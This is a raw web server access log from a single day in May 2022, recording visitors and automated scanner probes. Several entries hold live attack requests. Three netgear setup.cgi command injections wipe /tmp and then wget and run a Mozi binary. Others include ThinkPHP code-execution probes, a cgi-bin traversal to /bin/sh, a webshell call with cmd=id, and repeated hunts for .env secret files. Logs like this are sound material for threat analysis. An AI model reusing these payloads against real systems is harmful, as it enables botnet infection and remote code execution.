45.9.20.101 - - [10/May/2022:06:46:44 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:59:20 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:59:20 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:59:20 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:06:59:21 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:02:53 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:02:53 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:02:54 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:02:54 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
45.9.20.101 - - [10/May/2022:07:07:32 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.9.20.101 - - [10/May/2022:07:26:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.38.152.63 - - [10/May/2022:07:37:01 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://78.38.152.63:50674/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
216.218.206.66 - - [10/May/2022:07:51:48 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
119.18.1.27 - - [10/May/2022:07:58:09 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:58:09 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:58:10 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:07:58:10 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:05:32 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:05:32 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:05:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:05:33 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:06:19 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:08:06:20 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
192.241.220.113 - - [10/May/2022:08:10:46 +0000] "GET /hudson HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
45.9.20.101 - - [10/May/2022:08:12:20 +0000] "GET /console/ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
64.64.152.242 - - [10/May/2022:08:38:39 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.9.20.101 - - [10/May/2022:08:39:14 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [10/May/2022:08:41:42 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:08:41:42 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.126.125.185 - - [10/May/2022:08:53:21 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.126.125.185:56310/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
185.254.196.223 - - [10/May/2022:08:53:34 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:08:53:34 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [10/May/2022:09:15:20 +0000] "GET /_ignition/execute-solution HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:18:32 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:18:32 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:19:37 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:19:38 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:26:35 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:26:35 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:28:17 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:28:18 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:32:25 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:32:27 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:33:30 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:33:31 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
159.223.160.208 - - [10/May/2022:09:33:41 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
119.18.1.27 - - [10/May/2022:09:34:49 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:34:49 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:38:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:38:31 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:39:07 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:39:09 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
45.9.20.101 - - [10/May/2022:09:41:53 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:44:48 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:44:48 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:45:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:45:07 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:51:44 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:51:46 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:54:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:54:33 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
175.177.44.149 - - [10/May/2022:09:54:52 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
175.177.44.149 - - [10/May/2022:09:54:54 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:55:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:09:55:07 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
175.177.44.149 - - [10/May/2022:09:55:45 +0000] "-" 408 0 "-" "-"
119.18.1.27 - - [10/May/2022:10:00:48 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [10/May/2022:10:00:50 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
192.241.216.26 - - [10/May/2022:10:05:49 +0000] "GET /portal/redlion HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
192.241.221.162 - - [10/May/2022:10:08:14 +0000] "GET /actuator/health HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
193.118.53.194 - - [10/May/2022:10:13:10 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.9.20.101 - - [10/May/2022:10:35:54 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [10/May/2022:10:42:51 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:10:42:52 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.75.127.146 - - [10/May/2022:10:59:50 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://66.75.127.146:60995/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
45.9.20.101 - - [10/May/2022:10:59:51 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.113.171.237 - - [10/May/2022:11:23:35 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 500 803 "-" "-"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /server-status HTTP/1.1" 403 459 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "POST /scripts/WPnBr.dll HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /nmaplowercheck1652182060 HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /index.jsp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "POST /sdk HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET / HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "POST / HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /Portal/Portal.mwsl HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET / HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /Portal0000.htm HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "POST /functionRouter HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /CSS/Miniweb.css HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /.git/HEAD HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:40 +0000] "GET /j4Xf HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /HNAP1 HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /admin.php HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /docs/cplugError.html/ HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /__Additional HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /pools/default/buckets HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET / HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /inicio.pl HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /pools HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "HEAD / HTTP/1.1" 500 171 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:41 +0000] "GET /inicio.cfm HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /tomcatwar.jsp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET / HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /index.cgi HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /tomcatwar.jsp?pwd=j&cmd=id HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /inicio.jsp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:42 +0000] "GET /ghksjdghdfksanitycheckqwerjlhfgjksdghlid HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:43 +0000] "GET /start.pl HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:43 +0000] "GET /default.cfm HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:43 +0000] "GET /start.html HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:44 +0000] "GET /start.jsa HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:44 +0000] "GET /inicio.aspx HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:45 +0000] "GET /index.shtml HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:45 +0000] "GET /home.asp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:45 +0000] "GET /inicio.shtml HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:46 +0000] "GET /admin.pl HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:46 +0000] "GET /admin.jsp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:47 +0000] "GET /main.shtml HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:47 +0000] "GET /indice.cgi HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:47 +0000] "GET /admin.jsa HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:48 +0000] "GET /indice.pl HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:48 +0000] "GET /admin.html HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:49 +0000] "GET /localstart.cgi HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:49 +0000] "GET /admin.cgi HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:49 +0000] "GET /admin.cfm HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:50 +0000] "GET /base.jsp HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:50 +0000] "GET /menu.cgi HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:50 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
172.104.159.48 - - [10/May/2022:11:27:51 +0000] "GET /start.aspx HTTP/1.1" 500 803 "-" "curl/7.54.0"
172.104.159.48 - - [10/May/2022:11:27:59 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
172.104.159.48 - - [10/May/2022:11:28:00 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
45.9.20.101 - - [10/May/2022:11:36:54 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [10/May/2022:11:53:07 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:11:53:11 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.142.125.210 - - [10/May/2022:12:20:45 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.210 - - [10/May/2022:12:20:46 +0000] "PRI * HTTP/2.0" 400 488 "-" "-"
177.55.157.92 - - [10/May/2022:12:24:05 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
51.79.29.48 - - [10/May/2022:12:44:52 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:12:44:53 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [10/May/2022:14:35:37 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [10/May/2022:14:35:37 +0000] "\x16\x03\x01\x01D\x01" 400 488 "-" "-"
80.3.58.208 - - [10/May/2022:14:43:52 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
51.79.29.48 - - [10/May/2022:14:48:42 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
